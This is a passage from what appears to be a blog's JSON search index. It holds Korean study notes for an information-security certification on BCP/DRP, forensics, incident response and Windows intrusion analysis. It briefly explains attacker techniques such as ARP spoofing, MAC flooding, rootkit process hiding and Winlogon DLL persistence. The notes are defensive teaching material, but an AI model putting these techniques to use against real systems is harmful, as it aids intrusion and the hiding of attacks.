        "excerpt":"BCP (Business Continuity Plan)     사업 연속성 계획(BCP)            조직생존에 필요한 핵심기능 및 운영의 예기치 못한 중단으로 인해 발생하는 조직의 사업위험을 절감하기 위한 계획       인적/물적 자원을 확보하고, 핵심 운영에 필요한 최소수준의 서비스 연속성을 보증해야 함       핵심기능의 원상복구를 위한 포괄적 계획       BCP 도입을 위해 필요한 것                    시스템 파악           BIA (비즈니스 영향 평가)                           단계 (4단계)            프로젝트 범위 및 설정/기획       사업영향 평가       사업연속성 계획 개발       계획 승인 및 실행           단계 (5단계)            프로젝트 범위 및 설정/기획       사업영향 평가 (Business Impact Analysis)                    업무 중단시 미치는 영향을 정성적/정량적/기능적 분석                            MTD (최대 중단 허용시간) 산정               위험분석                                               복구전략개발       복구 계획 수립       프로젝트 수행테스트 및 유지보수           DRP (Disaster Recovery Plan)     재난 복구 계획(DRP)            재해, 재난 발생시 취해야 할 행동절차를 미리 준비       정보시스템의 기밀성, 무결성, 가용성 등을 확보하기 위함       사고 발생시 의사결정시간을 최소화해 복구시간 단축을 위함           BCP 와의 비교            공통점                    위험 수용           교정통제에 해당됨           조직의 가용성 확보에 초점을 둠                       차이점                    BCP : 사업활동, 업무프로세스의 중단을 막기 위함           DRP : 정보시스템, 데이터의 피해를 막기 위함                           재난 복구 서비스 (2차 사이트의 종류)            중복시스템 (Mirror site)                    주 센터와 동일한 수준의 환경을 원격지에 구축           Active - Active 구성           복구까지의 소요시간 (RTO) 이 0 에 가까움           비용이 많이 발생                       핫 사이트 (Hot site)                    주 센터와 동일한 수준의 환경을 원격지에 구축           Active - Standby 구성           실시간으로 최신데이터 상태를 유지해야 함           비용이 많이 발생                       웜 사이트 (Warm site)                    주 센터의 중요도가 높은 정보기술자원만 부분적으로 원격지에 구축           실시간 미러링을 수행하지 않음 (데이터 싱크에 텀이 있음)           완전한 복구까지 시간이 오래 걸림                       콜드 사이트 (Cold site)                    데이터만 원격지에 보관           그 외의 정보자원은 보관하지 않음 (최소화)           구축 / 유지비용이 저렴           완전한 복구까지의 시간이 오래 걸림                       제 3의 사이트 이용                    백업을 위한 백업           2차 사이트에 대한 가용성에 문제가 생길 때를 대비하기 위함                       상호지원계약                    조직의 정보자원 시스템과 유사한 시스템을 운영하는 기업과 계약을 맺음           해당 기업의 시설물을 이용하는 상호 협정체결                           BCP/DRP 용어     RTO : 복구되어야 하는 최단시간   RPO : 복구 목표 지점   RP : 전체복구기간 (RTO + MTD)   MTD : 치명적 손실 없이 조직이 버틸 수 있는 최대 허용 시간            RTO + WRT           WRT (Work Recovery Time) : 작업 복구 시간 (데이터복구, 프로세스 테스트)   BCP/DRP 테스트     Check List            문서테스트           구조적 워크스루            문서테스트       구조적 의사결정           시뮬레이션            실제 정보처리를 하지 않고 테스트를 해봄       1차 사이트만 테스트           병행테스트            1차,2차 사이트 동시 테스트           완전중단테스트            1차 중단, 2차사이트 테스트           침해사고 대응 7단계     침해사고의 종류            기밀성 침해                    고객정보/기밀정보 유출           비인가 시스템에 접근           비인가 정보 유출           주요 저장매체의 도난           도청, 감청, 네트워크 스니핑                       가용성 침해                    서비스 지연 / 중단           웜, 바이러스, 트로이목마, 백도어 등           물리적 침해           DoS 공격                       무결성 침해                    침입에 의한 정보변조           내부자나 외부자가 승인을 받지 않고 정보 조작                           NIST (4단계) - 미국국립표준기술연구소            예방 : 정보보호를 위한 평시활동                    침해사고대응팀-CERT 운영           정보보호 교육                       탐지/분석                    정보 자산에 대한 모니터링           초기분석                       대응                    침입 유형별 긴급조치           증거 데이터 수집                       복구                    재발방지 조치           대책 수립                           KISA (7단계) - 한국정보보호진흥원            사고전 준비                    효과적 사고대응을 위해 대처 방안 개발                       사고 탐지                    관리자에 의해 침해사고 식별                       초기대응                    침해사고 확산 방지에 중점           정밀조사를 위한 자료를 수집           CERT (침해사고대응) 팀 소집                       대응전략 체계화                    조직의 업무 목표를 고려하여 대응전략을 수립           내부처리 혹은 외부 수사기관 공조                       사고조사                    데이터 수집           데이터 분석                       보고서작성                    의사결정자를 위한 보고서 작성                       해결                    복구과정, 해결과정, 차후 예방을 위한 정책 적용                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","BCP","DRP"],
        "url": "https://bluesplatter.com/is_certification/IS-Management-BCP_DRP/",
        "teaser": null
      },{
        "title": "정보보안 - 포렌식",
        "excerpt":"포렌식     기본원칙 (법적인 효력을 가지기 위함, 발견,기록,획득,보관 절차가 적절해야 함)            정당성                    모든 증거는 적법한 절차를 거쳐 획득한 것이어야 한다.           위법한 절차로 획득한 증거는 증거능력 상실.                            해킹을 통해 시스템 내부의 증거 획득 -&gt; 증거능력 없음                                               재현                    같은 조건과 상황에서 항상 같은 결과가 나오는가?                       신속성                    디지털 포렌식의 모든 과정은 신속하게 진행되어야 한다.                       연계보관성                    증거물이 수집, 이동, 보관, 분석, 법정제출 각 단계에서 담당자 및 책임자가 명확한가?                       무결성                    수집된 증거가 위조,변조되지 않았는가?                           포렌식 3가지 기본 기술            원본데이터 변형 없이 증거로 수집하는 기술 (무결성)       보관증거가 원본데이터와 다르지 않다는 사실을 입증하는 기술 (무결성)       데이터 분석시 변조됨이 없이 분석하는 기술 (무결성)           포렌식의 5단계 절차            수사 준비 (사전준비) : 해당 포렌식 수행 인력, 장비, S/W 확보       증거물 획득 (증거수집) : 사건 발생 장소에서 N/W, PC 등을 압수, 임시파일, 손상된파일, 삭제파일 획득, 무결성이 중요       보관 및 이송 : 수집한 증거의 연계보관성 만족, 안전한 장소에 보관, 담당자 변경 시 기록을 남김       조사 및 분석 : 최량증거원칙, 법정등에 자료 제출 시 원본을 제출하도록 하는 원칙       보고서 작성 : 문서화          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","포렌식"],
        "url": "https://bluesplatter.com/is_certification/IS-Management-Forensic/",
        "teaser": null
      },{
        "title": "정보보안 - 침해사고 개요",
        "excerpt":"침해사고 개요     침해사고란?            정보통신망 이용촉진 및 정보보호 등에 관한 법률 제2조 1항 7조                    “침해사고”란 해킹, 컴퓨터바이러스, 논리폭탄, 메일폭탄, 서비스 거부 또는 고출력 전자기파 등의 방법으로 정보통신망 또는 이와 관련된 정보시스템을 공격하는 행위를 하여 발생한 사태를 말한다.                       바이러스, 트로이목마, 웜, 백도어, 악성코드 등을 이용한 공격       비인가된 System, 파일, 네트워크 정보 접근       비인가된 사용자가 서비스를 무단 이용       서비스 거부 등 네트워크, 시스템의 마비, 파괴           침해사고 대응 7단게            사고 발생,발견 또는 발생 시점 이전 단게                    사고 전 준비                       침해 사고 발생                    사고 탐지           초기 대응 : 기록, 침해사고 대응팀에 신고, 해당 부서에 통지           대응 전략 체게화 : 최적의 전략을 결정 (정책, 기술, 법…)           사고 조사 : 언제, 누구에 의해서, 피해 규모는 어느정도인지, 피해확산을 어떻게 방지할 것인지, 최소화 방안, 재발방지                            데이터 수집 : 증거의 완벽한 확보               데이터 분석                                   보고서 작성 : 경영진이 이해할 수 있는 내용으로 작성                       복구, 해결 과정           KISA 분석 요청 시            악성코드, 프로세스 등을 제거하면 안됌       반드시 제거해야 하는 경우                    악성파일 경로 확보           악성파일 백업           MAC Time 확보 (생성, 접근, 수정시간)                           사고 유형별 점검항목     공통            계정                    사용하지 않는 계정 확인 -&gt; 삭제           숨겨진 계정 확인 -&gt; 삭제           윈도우 : 관리도구 -&gt; 컴퓨터 관리도구 -&gt; 로컬사용자 및 그룹 -&gt; 사용자           리눅스 : /etc/passwd 확인                            패스워드가 없는 계정               /bin/bash 쉘 확인                                               로그파일                    이벤트로그, 시스템로그 변조 유무 확인           윈도우 : 관리도구 -&gt; 컴퓨터관리 -&gt; 이벤트뷰어           리눅스                            /var/log/secure               /var/log/meesage                                               웹쉘                    공격자가 원격에서 웹서버의 악의적 명령을 수행할 수 있도록 만들어진 파일           웹쉘 Signature 점검           asp, aspx, php, jsp, jpeg 등           업로드된 경로를 파악, 취약점을 제거           WHISTL 프로그램 사용하여 탐지                       백도어                    nmap 이용 하여 의심가는 포트 확인           netstat, TCPview 등 이용           백도어 관련 서비스 삭제                            방화벽 설정 (iptables, hosts.allow, hosts.deny)                                   해당 포트 차단           바이너리 변조 확인                       루트킷                    숨겨진 프로세스, 비정상적 프로세스 확인           변조된 파일, System 명령어 확인           윈도우 : IceSword           리눅스 : Rootkit Hunter, Check Rootkit           명령어 무결성 확인, 시스템 재설치 등                           웹변조 (웹사이트 변조)            웹페이지                    공통 확인 : index.html, main.html, default.html, index.php, main.php           IIS 계열 확인 : index.asp, main.asp, default.asp           메인페이지로 설정된 기타 파일 확인           웹페이지 내용이 변경된 경우 웹쉘의 감염 여부를 확인해야 함                            WHISTL 프로그램을 통해 웹쉘 감염여부 확인               웹쉘이 발견된 경우 접속로그를 통해 웹쉘에 접근한 IP를 확인 / 차단                                               HTTP 메소드                    윈도우 IIS 웹서버 : WebDAV 활성화 여부 확인                            WebDAV : 사용자가 원격으로 서버에 저장되어 있는 파일을 편집, 관리하는 HTTP 확장 기능                                    NAS 클라이언트를 사용해 HDD 드라이브처럼 사용                                               관리도구 -&gt; IIS 관리 -&gt; 웹서비스 확장               활성화 되어 있는 경우 사용중지로 변경                                   리눅스 Apache 웹서버 : httpd.conf 파일 확인                            &lt;Directory /&gt; 의 MOVE, PUT 메서드 의 Allow 여부 확인                                    GET, POST 를 제외한 메서드들을 허용하지 않는 것이 바람직함                   HEAD : 웹서버 다운유무, 웹서버의 정보를 얻기 위함 (헤더만 전송)                   OPTIONS : 시스템에서 지원하는 메서드의 종류를 확인                   DELETE, COPY, MOVE                   PUT : POST와 유사하나 파일을 변조시킬 수 있음                   TRACE : 원격지 서버의 루프백 메시지를 호출하여 사용                                                                               웹로그 : 생성, 수정 시간 확인                    윈도우 : IIS           리눅스 : /usr/local/apache/logs           웹로그에서 특정 메서드의 사용유무를 확인 : grep                       IIS, Apache 등의 설정이 변경된 경우                    Admin / root 등 서버관리자 계정 변경 필수                           악성코드 경유지/유포지            웹페이지 / 접속 IP                    악성코드 유포지 URL 이 삽입된 페이지를 검출           grep 명령어 사용           유포 페이지 생성, 수정 시간 확인                            해당 시점 기준 접속 로그, 시스템 로그 등을 분석, 또 다른 침해 여부 확인                                   접속 IP를 통해 좀비 PC를 찾아냄           WHISTL 을 이용해 웹쉘 감염 여부 확인, 삭제 조치                           봇넷 C&amp;C            네트워크 연결 확인                    윈도우 :                            netstat -an               6666,6667 포트 등 의심포트 확인                                    IRC (Internet Relay Chatting) Port (6667,6668)                   사용자 몰래 특정 IRC 서버에 접속하도록 함                                               wireshark 를 통한 패킷 분석                                   리눅스 :                            netstat -an               lsof -i               tcpdump 를 통한 패킷 분석                                               외부 네트워크와 연결된 백도어 포트가 발견된 경우                    방화벽을 이용해 해당 포트 접근 제한           해당 파일 삭제 조치                           해킹 경유지            네트워크 연결                    nmap, netstat 등을 활용하여 파악                       윈도우                    RRAS(Routing and Remote Access Service) 서비스 중지                            내부 네트워크에서 외부 네트워크 연결 시 사용                                   이벤트 로그 분석을 통해 RRAS 를 실행한 서비스, IP를 확인           컴퓨터관리 -&gt; 서비스 및 응용프로그램 -&gt; 서비스 -&gt; Routing And Remote Access Service 사용안함                       리눅스                    PPTP(Point-to-Point Tunneling Protocol) 서비스 중지                            VPN 프로토콜, MS에서 개발               윈도우에서 오랫동안 사용                                   시스템 로그를 이용해 PPTP 를 실행한 로그, IP를 확인 (21:37)                                                                           ps -ef                   grep pptpd                                                                               설치 프로그램                    윈도우 : 제어판 -&gt; 프로그램 추가/제거 -&gt; CCProxy, RealVNC 등의 설치여부 확인           리눅스 : Rootkit Hunter 등을 활용                           사고 유형별 대응전략     DoS 공격            라우터 재설정 (공격 완화)           비인가 사용            업무용 컴퓨터 오용 -&gt; 포렌식 이미징 작업, 용의자와 면담, 범인 식별, 증거확보       징계 결정 (직위, 과거조직 등 고려)           파괴 행위            웹사이트가 손상이 되는 경우       복구 필요           정보의 도난            신용카드 도난, 고객정보 유출       관련시스템 이미지 확보       수사기관 참여       도난신고, 법적 대응           컴퓨터 침입            buffer overflow, IIS 등 으로 침입       비인가 접속 차단       취약점 식별       보안 패치       범인 식별          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","침해사고"],
        "url": "https://bluesplatter.com/is_certification/IS-IncidentAnalysis-Outline/",
        "teaser": null
      },{
        "title": "정보보안 - 침해사고 분석 절차",
        "excerpt":"침해사고 분석 절차     침해사고 분석의 목적            사고의 수습       누가 공격을 하였는지 파악                    데이터 수집 -&gt; 범행 단서 수집           법적 소송에 필요한 데이터 : 무결성, 적법성을 유지해야 함                       수집하는 데이터 정보 종류                    호스트 기반 정보 (증거)                            시스템 시간               휘발성 데이터 (우선 수집 대상)                                    수집하기 위해서 Live Response 수행 필요                                            살아있는 System 에서 휘발성 정보를 수집하는 행위                       Initial Live Response : 휘발성 데이터만 수집                       In-depth Response : 휘발성 데이터 + 충분한 부가정보 (법적대응에 필요한 정보-무결성,적법) 수집                       Full Live Response : Live System 의 완전조사                                                           시스템의 날짜, 시간                   시스템에서 현재 동작 중인 어플리케이션                   현재 연결된 네트워크 상황                   현재 열려진 소켓(포트)                   열려진 소켓 상에서 대기하고 있던 어플리케이션                   네트워크 인터페이스의 상태                   메모리 정보, 현재 열려있는 파일, 시스템 패치 상황                                               시스템의 모든 파일들의 생성,수정 시간/날짜 정보                                    공격자에 의한 Upload 된 파일 식별을 위함                   시스템으로 Upload / Download 된 파일 식별                                               출처 미확인 파일               디스크 백업 수집                                   네트워크 기반 정보 (증거)                            IDS 로그 수집               IPS 로그 수집               라우터 로그 수집               방화벽 로그 수집               인증서버 로그 수집               중앙호스트 (Syslog) 로부터의 원격로그 수집                                   일반적 증거                            증인으로부터의 수집                                                   증거 수집 전략 (네트워크)            장비를 종료/재부팅 하는 것을 피함                    네트워크 기반의 증거들이 장비의 메모리에 휘발성 데이터로 존재                       네트워크를 통한 접근 (원격접근) 보다 콘솔을 통해 연결                    조사의 흔적을 최소화 하기 위함           원격접근은 Traffic 을 발생시킴                       시스템 시간 정보 기록                    네트워크 장비와 신뢰할 만한 시스템의 시간 차이를 확인           대부분의 포렌식 툴은 로그의 시간 차이를 조정하는 기능이 제공되지 않음                            수동으로 비교, Script 를 만들어 사용                                               휘발성 정도에 따라서 증거를 수집                    휘발성이 높은 증거부터 수집                       조사활동을 모두 기록                    실수에 의한 기록을 남기더라도 가능한한 모든 기록을 남기는 것이 중요           GUI 접속은 화면캡처나 사진 등                           네트워크 기반의 증거 수집            패시브 증거 수집 : 계층 이상의 상위 계층에 데이터를 송신하지 않고 포렌식 용 증거를 수집하는 방법                    케이블을 이용하여 감청                            트래픽 스니핑 툴 사용                                   주파수 감청 (무선)                            무선 AP Mac 주소                                   허브 (1계층) / 스위치 (2계층) 이용                            포트 미러링 : 하나 이상의 포트에서 다른 포트의 트래픽을 복제               MAC 플러딩 : 다량의 맥 주소를 사용하는 임의의 이더넷 패킷을 보내 CAM 테이블을 채워, MAC 포트를 연결할 수 없게 되었을 때 모든 포트에 트래픽을 전송               ARP 스푸핑 : 공격자의 MAC 주소를 희생자의 IP와 매핑 시켜 거짓 ARP 패킷을 송신                                   트래픽 수집 소프트웨어 사용                            libpcap                                    네트워크 상의 인터페이스에 대한 데이터링크 계층의 프레임을 캡쳐                                               winpcap                                    윈도우에서 돌아가는 libpcap                                               패킷스니퍼                                    libpcap 기반 동작                                               tcpdump                                    리눅스 기반 플랫폼에서 동작 / 윈도우의 경우 windump (winpcap)                   libpcap 기반 동작                   트래픽 캡처 / 필터링                                               wireshark                                    트래픽 캡처 / 필터링                   그래픽 기반 툴                                                                               액티브 (인터렉티브) 증거 수집                    휘발성 증거는 시스템이 동작하고 네트워크가 연결된 상태에서 수집           네트워크 상의 스테이션과 상호 작용하여 증거를 수집하는 방법                            콘솔로 직접 연결하는 방법                                    트래픽이 발생하지 않음 (흔적이 덜 남게 됨)                                               SSH / SCP,SFTP 를 이용하는 방법                                    Telnet 이나 Rlogin, TFTP 같은 취약한 원격 연결 툴 (Plain Text 전송) 보다 감청을 당해도 안전                                               SNMP 프로토콜 사용                                    포렌식에서 사용되는 대부분의 툴이 SNMP 프로토콜을 사용                                               SSL / TLS 를 이용한 웹데이터 수집                                   네트워크 접근을 하지 않고 조사하는 방법                            포트 스캐닝               취약점 조사                                                   데이터 분석 절차            포렌식 이미징 작업 : 사본 만들기       데이터의 준비                    수집 이미지의 사본 제작           파일 리스트 생성           삭제 파일 복구           비 할당 공간 복구           파일 시그니처 분석 수행           알려진 시스템 파일 식별           통계적인 데이터 파티션 테이블 파일 시스템 수행                       데이터의 분석                    이메일과 첨부파일 뽑아내기           브라우저 히스토리 파일 재검토           설치된 어플리케이션 재검토           수집된 데이터 재검토           적절한 스트링 검색           모든 네트워크 기반 증거 재검토           소프트웨어 분석 수행           암호화된 파일 식별과 해독           파일 대 파일 재검토 수행           특성화된 분석 수행                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","침해사고"],
        "url": "https://bluesplatter.com/is_certification/IS-IncidentAnalysis-Procedure/",
        "teaser": null
      },{
        "title": "정보보안 - 윈도우 사고 초기분석",
        "excerpt":"윈도우 침해사고 초기분석     초기분석 : 현재 피해시스템의 상황을 빠른 시간 안에 파악한다. (포렌식 툴을 사용하지 않는다는 가정 / 커맨드에서 실행)            시스템 시간 확인                    공격자가 시스템 시간을 변경할 수 있음           date /T, time /T 등의 명령어 사용           uptime : 시스템의 부팅시간 정보를 알려줌 (추가 다운로드 필요-sysinternals.com)                       시스템 정보                    psinfo -h -s : OS 기본정보, 보안 업데이트 정보, 설치된 S/W 정보 (추가 다운로드 필요-sysinternals.com)                       프로세스 정보 확인 (휘발성 증거)                    공격자가 실행시킨 악성프로그램 확인                            실행 프로세스명               프로세스 실행 파일 위치               프로세스 커맨드라인               프로세스 실행시간               프로세스 가 참조하고 있는 DLL 및 기타 파일                                   pslist 명령어사용 (추가 다운로드 필요-sysinternals.com)                            현재 구동중인 프로세스 목록 조회               프로세스 실행시간 확인               -t : 트리구조 옵션 (자식프로세스)                                   정상적인 윈도우 프로세스인지 확인하기 위한 용도                            흔히 볼수 없었던 프로세스명은 악성코드일 확률이 있음               정상파일로 위장을 해서 악성프로그램 실행을 하는 경우 실행파일 위치를 확인해야 함                                   프로그램들이 사용하는 DLL 을 자세히 점검할 필요가 있음                            listdlls (추가 다운로드 필요-sysinternals.com) : dll 경로, 사이즈, 버전정보                                    프로세스들이 사용하는 DLL 정보 출력                                                                   handle 명령어 사용 (추가 다운로드 필요-sysinternals.com)                            악성 봇 프로그램 같은 경우 프로세스가 참조하는 파일(설정파일 등)을 출력해야 함                                               네트워크 정보 확인 (휘발성 증거) - 공격자의 흔적 추적                    피해시스템의 네트워크 정보           서비스를 열고 있는 어플리케이션 정보           서비스에 연결되어 있는 세션 정보           ipconfig /all 명령어 사용 - IP 확인           netstat -an                            프로토콜의 상태 확인               IP 기반의 네트워크 연결 정보 확인               현재 열려있는 포트               포트에 연결되어 있는 IP 정보               시스템이 사용하지 않는 포트가 LISTENING 상태로 있는지 확인                                    telnet 이나 nc 등의 명령어로 어떤 어플리케이션이 해당 포트를 구동중인지 확인                                                                   fpont (추가 다운로드 필요-foundstone.com)                            해당 포트에서 사용하고 있는 프로세스 확인 가능                                   promiscdetect (추가 다운로드 필요 - tesecurity.nu)                            NIC 카드가 promisc 인지 확인 필요 (스니핑, 모니터링 여부)                                               사용자/그룹 확인                    공격자에 의해서 추가된 유저나 그룹이 있는지 확인                            net user : 시스템에 존재하는 모든 계정 출력               net localgroup : 시스템에 있는 모든 그룹정보 출력                                               공유, 로그인 정보 확인                    net : 시스템의 공유 정보, 현재 로그인되어 있는 사용자 정보 확인           nbtstat : NBT (Net Bios) 에 의해서 연결된 정보를 확인                            NBT (Net Bios over TCP/IP)                                    TCP/IP 사용 기기의 고유 IP주소가 있으면 통신이 가능                   Windows OS 의 경우 NetBios 기술을 사용                                            NetBios 의 이름 (컴퓨터 이름) 을 IP 보다 더 중요하게 사용                       NETBIOS 는 네트워크 통신을 위한 기본적인 명령어 세트                       BIOS : Basic Input Output System                                                           NetBIOS 의 기능                                            컴퓨터 이름(네트워크 참여 시 식별자 이름) 등록/해제 (이름 삭제를 통한 네트워크 이탈)                       세션 서비스 - Session 지향 (1:1통신) 의 통신서비스 제공 (22:10)                       데이터그램 서비스 - Datagram 지향 (상대에게 일방적으로 데이터를 보냄) 의 통신서비스 제공                                                           NetBIOS 통신                                            NetBIOS 이름 등록 (네트워크 참여)                                                    중앙집중식 네트워크 관리서버가 존재하지 않음                           시스템이 켜지면 시스템이 가지고 있는 컴퓨터 이름을 Broadcasting                                                            Network 상의 모든 컴퓨터에 통보                               이름 충돌이 없으면 사용                                                                                                                               NetBIOS 이름을 사용해서 통신상대를 식별, 통신 패킷을 송신                       시스템 종료시 NetBIOS 이름 삭제 (네트워크 이탈)                                                           예전에는 순수한 NetBIOS 인터페이스를 사용하였으나 최근에는 컴퓨터 이름으로 사용                   nbtstat -c : NBT에 연결된 세션정보 출력                                                                   윈도우 감사정책이 설정되어 있는 경우 ntlast (추가다운로드-foundstone.com) 명령어 사용                            로그인/로그오프 성공, 실패 여부 확인               ntlast -f : 원격 접속 로그정보 출력                                   net share : 시스템 공유정보 출력           net session : 공유자원에 접속된 컴퓨터 정보 출력                           Batch 스크립트를 만들어 결과를 파일로 저장하거나 자동화된 도구를 사용  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","윈도우 침해사고"],
        "url": "https://bluesplatter.com/is_certification/IS-IncidentAnalysis-WindowsInitialResponse/",
        "teaser": null
      },{
        "title": "정보보안 - 윈도우 루트킷 점검",
        "excerpt":"윈도우 루트킷 점검     Rootkit            정의                    시스템에 탐지되지 않도록 하는 코드, 프로그램 집합           시스템 관리자 권한을 획득하기 위한 프로그램                       구분                    사용자모드                            파일교체 (DLL, IAT후킹, API 엔트리패치 방법을 이용해서 정보를 숨김)                                   커널모드                            Native API (ntdll.dll, Kernel32.dll, user32.dll) 조작               커널드라이브 - Win32 응용프로그램 간의 Data를 조작               공격자의 정보를 숨김                                               기능                    프로세스 / 스레드 감추기           프로세스 보안설정 변경 / 제거           파일 / 폴더 감추기           레지스트리 / 서비스 감추기           네트워크 정보 감추기           스니핑, 시스템 제어                           윈도우 루트킷 종류            Hacker Defender                    현재 가장 광범위하게 사용됨           다양한 변종이 존재           프로세스, 네트워크, 시작프로그램, 레지스트리, 서비스 등을 숨기는 가장 많은 기능 제공                       FU                    “EPROCESS” 의 링크 조작을 통한 프로세스를 숨기는 기능 제공                            중요한 정보들이 목록화 되어있는 파일               시스템 커널이 실행중인 모든 프로세스의 리스트를 찾고자 할 때 사용                                    윈도우 커널의 경우 프로세스가 아닌 스레드 기반으로 동작                   연결리스트 포인터 수정 가능                                               ActiveProcessLinks 의 Linked List 를 조작                                               Vanquish                    DLL 인젝션 기법을 사용한 루트킷           프로세스, 레지스트리, 서비스를 숨기는 기능           로그인 정보 기록 기능 제공                       AFX rootkit                    코드 인젝션과 API 후킹을 사용하는 루트킷           프로세스, 모듈, 핸들, 파일, 포트, 레지스트리 등을 숨길 수 있는 기능 제공                       NT Rootkit                    초기 윈도우 루트킷으로 현재까지 업데이트가 없는 상태임                           윈도우 루트킷 탐지 도구            procexp       Rootkit Receiver       BlackLight       AntiRootkit       IceSword       Archon          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","윈도우 침해사고","루트킷"],
        "url": "https://bluesplatter.com/is_certification/IS-IncidentAnalysis-WindowsRootkit/",
        "teaser": null
      },{
        "title": "정보보안 - 윈도우 침해사고 상세분석",
        "excerpt":"윈도우 침해사고 상세분석     분류            레지스트리 분석                    시스템이 운영되는데 필요한 정보를 담고 있는 파일                            설치된 S/W 정보, 환경설정, 임시저장값               시스템의 모든 정보 포함                                   공격자의 흔적을 알아낼 수 있음           시작프로그램 등록 관련 레지스트리                            HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run               HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce               HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx               HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices               HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce               HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Windows\\Load               HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Windows\\Run               HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon\\UserInit               HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run               HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce               HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx               HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce                                   Autoruns : 시작 레지스트리 Check (Sysinternals.com)           공격자가 남긴 레지스트리 정보 수집                            최근 사용한 문서 목록                                    HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Recentdocs                                               터미널 서비스 접속 목록                                    HKCU\\Software\\Microsoft\\Terminal Server Client\\Default                                               설치된 S/W 목록               열어본 파일 목록                                               자동실행 점검 - Autoruns 를 통해 점검 가능                    서비스 점검                            공격자가 윈도우 서비스에 악성 프로그램을 등록, 시스템 재부팅 시 악성 프로그램 실행               생소한 이름의 서비스               Description 영역의 내용이 비어있는 경우 / 영문으로 되어있는 경우               정상적 서비스 이름을 위장하는 경우                                    Backup System                   Remote Administrator Service                   System spooler Host                   Windows Management Drivers                   Universal Serial Bus Control Component                                                                   스케줄된 작업 확인                            시스템이 재부팅 되더라도 악성 프로그램이 실행될 수 있음                                   자동시작 폴더 점검                            윈도우 재시작 시 자동시작 폴더 내 각종 프로그램들을 실행함               c:\\Documents and Settings\\Administrator\\시작메뉴\\프로그램\\시작프로그램               HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellFolders                                   Winlogon Notification DLL                            적은 코드로 구현이 가능, 안전모드에서 원하는 코드를 실행 가능               WinLogon.exe 파일에서 발생하는 이벤트 핸들러를 이용하여 원하는 코드를 실행 가능                                    Logon, Logoff, Startup, Shutdown, ScreenSaver 이벤트 등                                               악성코드 활용 소지가 있음               HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\                                    DllName = arprmdg0.dll (악성코드 예시)                   Startup = arprmdg0                   Impersonate = 1 (인격화. 보안 환경변수 설정시 주로 설정, 인증된 사용자 계정으로 자원 실행할 수 있게 함)                                                                               이벤트 로그 분석                    공격자가 남긴 흔적, 활동 등의 정보를 찾아내기 위함           H/W, S/W, 시스템 문제 시 이벤트로그에 저장함 -&gt; 이벤트뷰어를 통해 확인                            관리도구 -&gt; 이벤트뷰어 (eventvwr.msc)                                    보안로그                   시스템로그                   응용프로그램로그                                                                   공격자들은 자신의 흔적을 최소화 하기 위해 ClearEvent 프로그램을 사용 (이벤트로그를 삭제)           공격자가 남기는 로그 유형                            로컬 로그온 시도 실패               계정의 잘못된 사용 (없는 계정 로그인 시도)               계정 잠김               터미널서비스 공격               사용자계정 생성                                               MAC time 분석                    파일, 디렉터리 등 파일시스템은 시간속성을 가지고 있음           공격자가 파일시스템을 통해서 어떠한 행동을 했는지 판단 (어떤 파일이 생성, 수정, 실행되었는지?)           mtime : 파일 수정, 생성           atime : 최근 파일을 읽은 시간, 실행한 시간           ctime : 파일 속성 변경 시간                       침입방법 분석                    공격자가 어떻게 침입했는지 분석 (사고 조치 이외에 원인분석을 하지 않으면 사고가 재발할 수 있음)           윈도우에서 해킹발생 취약점 분류 (대부분 해킹사고는 시스템 보안 업데이트 미실시, 웹서비스 취약점이 원인)                            윈도우 취약점                                    시스템 취약점 (보안업데이트 미실시)                                            최종 보안 업데이트 날짜 파악이 중요                                                    원격 공격 가능한 취약점이 있는지 파악                                                                       MS 에서 제공하는 Microsoft Baseline Security Analyzer 로 확인                                                    보안패치 상태                           IIS 상태                           SQL 상태                                                                                                           패스워드 취약점                   잘못된 공유설정                                               웹 어플리케이션 취약점                                    웹서비스 취약점                                            해킹 발생 시점에 발생한 로그를 분석하여 공격여부, 공격방법등을 파악                       IIS 로그 : C:\\WINNT\\system32\\LogFiles\\W3SVC1                                                           SQL Injection                   파일업로드                                               MS-SQL 취약점                                    Default password 사용                   패치 미실시                                                                               인터넷 임시파일 분석                    브라우저와 연관                            접속한 사이트의 페이지가 임시파일에 저장됨               접속 흔적이 히스토리에 남음               사용된 쿠키가 디스크에 저장됨                                   파일 위치 : indexView 도구를 다운받아 쉽게 분석 가능                            임시 인터넷 객체 : Download Program Files - 인터넷에서 다운로드 받은 파일들               임시 인터넷 파일 : Local Settings\\Temporary Internet Files - 방문한 사이트 페이지               열어본 페이지 : Local Settings\\History - 방문한 사이트 이름               임시쿠키 파일 : Local Settings\\COOKIES                                                  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","윈도우 침해사고","상세분석"],
        "url": "https://bluesplatter.com/is_certification/IS-IncidentAnalysis-WindowsDetailAnalysis/",
        "teaser": null
      },{
        "title": "정보보안 - 윈도우 해킹프로그램 분석",
